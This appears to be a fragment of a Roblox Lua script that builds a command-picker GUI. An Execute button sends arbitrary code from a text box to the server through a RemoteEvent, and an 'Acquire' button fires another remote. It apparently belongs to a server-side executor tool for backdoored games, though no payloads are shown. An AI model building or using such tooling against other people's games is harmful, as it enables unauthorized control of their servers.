CommandScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = CommandScroll
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 5)

local UIGridPadding = Instance.new("UIPadding")
UIGridPadding.Parent = CommandScroll
UIGridPadding.PaddingLeft = UDim.new(0, 5)
UIGridPadding.PaddingRight = UDim.new(0, 5)
UIGridPadding.PaddingTop = UDim.new(0, 5)
UIGridPadding.PaddingBottom = UDim.new(0, 5)

-- Function to create command buttons dynamically
local function createCommandButton(command)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, 0, 0, 30)
	btn.BackgroundColor3 = Color3.new(0, 0, 0)
	btn.BorderColor3 = Color3.new(200, 200, 255)
	btn.Font = Enum.Font.Legacy
	btn.TextSize = 12
	btn.TextColor3 = Color3.new(200, 200, 255)
	btn.Text = command.name
	btn.AutoButtonColor = true

	btn.MouseButton1Click:Connect(function()
		CodeBox.Text = command.code
	end)
	btn.Parent = CommandScroll
end

-- Create buttons for all commands
for _, cmd in ipairs(commands) do
	createCommandButton(cmd)
end

-- Adjust canvas size automatically
-- Since UIListLayout with AutomaticCanvasSize = Y will auto resize canvas size,
-- you only need to update ScrollBarThickness or call CanvasSize update manually if needed.
CommandScroll.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 10)

-- Listen for changes in UIListLayout size to update CanvasSize dynamically if commands change
UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
	CommandScroll.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 10)
end)

-- Execute button functionality
ExecuteButton.MouseButton1Click:Connect(function()
	if RemoteEvent then
		RemoteEvent:FireServer(CodeBox.Text)
	end
end)

-- Acquire button functionality
AcquireButton.MouseButton1Click:Connect(function()
	if AcquireEvent then
		AcquireEvent:FireServer()
	end
end)
message.txt
35 KB
